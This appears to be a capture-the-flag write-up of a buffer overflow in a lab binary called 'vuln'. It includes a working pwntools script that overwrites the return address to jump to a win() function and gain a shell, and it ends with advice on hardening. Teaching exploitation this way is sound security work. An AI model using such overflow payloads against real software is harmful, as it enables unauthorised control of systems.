Category: Binary Exploitation (Buffer Overflow)
Difficulty: Hard

Summary: Discovered a classic buffer overflow in a custom binary that accepts user input without bounds checking. Used pwntools to craft payloads and gain shell.

Steps:

from pwn import *

elf = context.binary = ELF('./vuln')
p = process(elf.path)
p.recvline()

payload = b"A" *  cyclic_find(0x6161616c)  # EIP offset
payload += p32(elf.symbols['win'])  # Redirect to win()

p.sendline(payload)
p.interactive()

Lesson: Always compile with stack canaries, NX, and ASLR. Never trust user input.
